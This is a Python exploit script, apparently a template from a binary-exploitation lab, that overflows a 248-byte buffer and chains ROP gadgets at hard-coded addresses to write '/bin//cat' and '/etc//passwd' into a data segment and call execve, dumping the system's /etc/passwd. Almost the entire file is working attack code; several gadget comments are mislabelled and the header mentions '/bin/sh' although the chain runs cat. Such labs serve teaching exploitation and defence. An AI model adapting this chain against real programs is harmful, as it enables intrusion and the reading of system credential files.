

# This python script will help you to set up your ROP-chain
# You just need to complete it (see the comments)

#!/bin/env python3
from struct import pack
from os import write

pop_rax = pack("<Q", 0x451f87) # address of the "pop rax ; ret" gadget (check if it is correct !)
pop_rdi = pack("<Q", 0x401912) # address of the "pop rdi ; ret" gadget
pop_rsi = pack("<Q", 0x40f27e) # address of the "pop rsi ; ret" gadget
pop_rdx = pack("<Q", 0x40181f) # address of the "pop rdx ; ret" gadget
movd_rdx_rax = pack("<Q", 0x420538)  # address of the "mov qword ptr [rdx], rax ; ret" gagdet
syscall = pack("<Q", 0x465797) # address of the "pop rax ; ret" gadget
movd_rdi_null = pack("<Q", 0x4477a6) # address of the "pop rax ; ret" gadget
at_data = pack("<Q", 0x4c00e0)  # address of data segment
at1_data = pack("<Q", 0x4c00e0+len("/bin//ca"))  # address of data segment
at2_data = pack("<Q", 0x4c00e0+len("/bin//ca")+len(b"t/etc//p"))  # address of data segment
null = pack("<Q", 0x00)
execve = pack("<Q", 59)
null_to_rax_8 = pack("<Q",0x41f804)
buff = 248 * b"A"           

binca = b"/bin//ca"
b2 = b"t:/etc//"
b3 = b"passwd"
 
""" step 1: write /bin/sh in the data segment """
buff += pop_rdx
buff += at_data
buff += pop_rax
buff += binca.ljust(8, b"\x00")
buff += movd_rdx_rax


buff += pop_rdx
buff += at1_data
buff += pop_rax
buff += b2.ljust(8, b"\x00")
buff += movd_rdx_rax

# 0x000000000044df4c : movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret

buff += pop_rdx
buff += at2_data
buff += pop_rax
buff += b3.ljust(8, b"\x00")
buff += movd_rdx_rax

null1_addr = pack("<Q", 0x4c00e0+len("/bin//ca")-1)  # address of data segment


buff += pop_rdi
buff +=null1_addr
buff += movd_rdi_null

#0x0000000000429c45 : mov byte ptr [rax], al ; add bh, dh ; ret 0
#0x000000000044ad56 : mov byte ptr [rdi + 2], dh ; ret
#0x00000000004477a6 : mov byte ptr [rdi + 2], 0 ; vzeroupper ; ret
#0x000000000041f804 : mov qword ptr [rax + 8], 0 ; ret

add_arg1 = pack("<Q",0x4c00e0)
add_arg2 = pack("<Q",0x4c00ea)

buff += pop_rdx 
buff += pack("<Q",0x4c00ea + len("/etc//passwd") + 1).ljust(8,b"\x00")
buff += pop_rax
buff += add_arg1
buff += movd_rdx_rax
addr= pack("<Q",0x4c00ea+0xc+0x8 + 1).ljust(8,b"\x00")
buff += pop_rdx
buff += addr
buff += pop_rax
buff += add_arg2
buff += movd_rdx_rax

buff += pop_rax
buff += addr

buff += null_to_rax_8

buff += pop_rdi
buff += at_data

buff += pop_rsi
buff += pack("<Q",0x4c00ea+0xc+1).ljust(8,b"\x00")

buff += pop_rdx
buff += null  #

buff += pop_rax
buff += execve

buff += syscall

write(1, buff)  # write buff to stdout ...
write(1, b"\n") # trigger!

